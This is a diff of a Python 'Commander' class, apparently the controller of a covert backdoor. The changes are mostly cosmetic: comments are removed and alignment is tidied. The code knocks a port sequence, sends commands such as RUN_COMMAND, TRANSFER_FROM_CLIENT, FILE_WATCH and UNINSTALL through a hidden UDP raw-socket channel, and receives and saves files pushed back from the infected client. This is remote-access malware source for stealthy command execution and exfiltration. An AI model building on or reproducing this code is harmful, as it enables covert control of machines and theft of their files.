@@ -40,21 +40,17 @@ class CommandType(IntEnum):
 COMMANDS_WITH_RESPONSE = frozenset([
     CommandType.RUN_COMMAND,
     CommandType.TRANSFER_FROM_CLIENT,
-    # CommandType.FILE_WATCH,
-    # CommandType.STOP_WATCH,
     CommandType.UNINSTALL,
 ])
 
 
 class Commander:
     """
-    Commander that:
-    1. Performs TCP port knock sequence
-    2. Sends commands via UDP raw socket covert channel
+    Performs TCP port knock sequence, sends commands via UDP raw socket covert channel, and receives responses
+    from the client
     """
 
     def __init__(self, target_host, knock_sequence=None):
-        # Resolve localhost before storing
         if target_host == "localhost":
             target_host = "127.0.0.1"
         self.target_host = target_host
@@ -110,13 +106,6 @@ class Commander:
     def send_covert_command(self, command_type, payload=b'', context=None):
         """
         Send a command via the raw socket covert channel.
-
-        For commands that expect a response the receive socket is opened
-        BEFORE the command packet is sent, eliminating the race condition
-        where the first response packet arrives before we start listening.
-
-        context: optional dict passed through to display_response()
-                 e.g. {'filename': 'client_secret.txt'} for TRANSFER_FROM_CLIENT
         """
         print(f"\nSending covert command: {command_type.name}")
         print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
@@ -127,11 +116,9 @@ class Commander:
 
         needs_response = command_type in COMMANDS_WITH_RESPONSE
 
-        # ── KEY FIX: open the receive socket BEFORE we send ──────────────
         if needs_response:
             self.protocol.prepare_recv_socket()
-            time.sleep(0.1)  # give the kernel time to attach the BPF filter
-        # ─────────────────────────────────────────────────────────────────
+            time.sleep(0.1)
 
         success = self.protocol.send_packet(
             self.source_ip,
@@ -367,7 +354,6 @@ class Commander:
         """
         Block the interactive session in watch-only mode.
         Starts a background thread to receive pushed file/delete packets.
-        Only 'stopwatch' or Ctrl+C exits.
         """
         # Open receive socket before entering the loop
         self._watch_stop.clear()
@@ -456,20 +442,17 @@ class Commander:
                 if parsed['dst_port'] != self.command_port:
                     print(f"{parsed['dst_port']} {self.command_port}")
                     continue
-                # if parsed['command'] not in (CommandType.FILE_WATCH, CommandType.FILE_DELETE, CommandType.STOP_WATCH):
-                #     print(f"Wrong command {parsed['command']}")
-                #     continue
 
-                seq   = parsed['seq']
-                data  = parsed['data']
+                seq = parsed['seq']
+                data = parsed['data']
                 total = parsed['total']
-                cmd   = parsed['command']
+                cmd = parsed['command']
 
                 # New transfer starting
                 if expected_total is None:
                     expected_total = total
-                    current_cmd    = cmd
-                    chunks         = {}
+                    current_cmd = cmd
+                    chunks = {}
 
                 chunks[seq] = data
 
@@ -489,7 +472,7 @@ class Commander:
                     payload = raw[:-1] if (expected_total * 2) > len(raw) else raw
 
                     # Reset state for next transfer
-                    chunks        = {}
+                    chunks = {}
                     expected_total = None
 
                     if current_cmd == int(CommandType.FILE_WATCH):
@@ -506,9 +489,9 @@ class Commander:
         """Save a file pushed by the client into received_files/."""
         try:
             filename_len = struct.unpack('!H', payload[:2])[0]
-            filename     = payload[2:2 + filename_len].decode('utf-8')
-            filedata     = payload[2 + filename_len:]
-            save_path    = os.path.join(RECEIVED_DIR, filename)
+            filename = payload[2:2 + filename_len].decode('utf-8')
+            filedata = payload[2 + filename_len:]
+            save_path = os.path.join(RECEIVED_DIR, filename)
             with open(save_path, 'wb') as f:
                 f.write(filedata)
             print(f"\nWatch: received '{filename}' ({len(filedata)} bytes) → {save_path}")
